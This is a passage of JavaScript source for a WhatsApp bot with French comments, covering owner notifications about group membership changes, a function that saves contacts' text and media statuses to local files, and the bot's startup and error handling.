      if (OWNER && ['add','remove','promote','demote'].includes(action)) {
        const meta = await sock.groupMetadata(id).catch(() => null);
        const actionText = { add: '+', remove: '-', promote: 'PROMU', demote: 'DEMOTE' };
        const names = jids.map(p => p.split('@')[0]).join(', ');
        await sock.sendMessage(OWNER, { text: `${actionText[action] || '?'} ${meta ? meta.subject : id}\n${names}` }).catch(() => {});
      }
    });

    // Fonction downloadStatus (nécessaire pour les status)
    async function downloadStatus(msg) {
      try {
        if (!msg.message) return;
        const normalized = normalizeMessageContent(msg.message);
        if (!normalized) return;
        const type = getContentType(normalized);
        if (type === 'conversation' || type === 'extendedTextMessage') {
          const text = type === 'conversation' ? normalized.conversation : normalized.extendedTextMessage.text;
          const logPath = path.join(DIRS.media.status_dl, `status_texte_${Date.now()}.json`);
          fs.writeFileSync(logPath, JSON.stringify({ de: msg.pushName || '?', texte: text, ts: moment().format('YYYY-MM-DD HH:mm:ss') }, null, 2));
          return;
        }
        const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage'];
        if (mediaTypes.includes(type)) {
          const info = normalized[type];
          const mediaKey = type === 'imageMessage' ? 'image' : type === 'videoMessage' ? 'video' : 'audio';
          const stream = await downloadContentFromMessage(info, mediaKey);
          const chunks = [];
          for await (const c of stream) chunks.push(c);
          const buffer = Buffer.concat(chunks);
          let ext = mediaKey === 'image' ? 'jpg' : mediaKey === 'video' ? 'mp4' : 'mp3';
          if (info.mimetype) {
            const mimeExt = info.mimetype.split('/')[1]?.split(';')[0];
            if (mimeExt && ['jpg','jpeg','png','gif','webp','mp4','3gp','mp3','ogg'].includes(mimeExt)) ext = mimeExt;
          }
          const filename = `status_${mediaKey}_${Date.now()}.${ext}`;
          fs.writeFileSync(path.join(DIRS.media.status_dl, filename), buffer);
          console.log(`Status ${mediaKey}: ${filename}`);
        }
      } catch (e) {
        console.error('Erreur dl status:', e.message);
      }
    }

    console.log('🤖 Bot opérationnel !\n');
  } catch (e) {
    console.error('❌ Erreur fatale:', e);
    process.exit(1);
  }
}

connectBot().catch(e => {
  console.error(e);
  process.exit(1);
});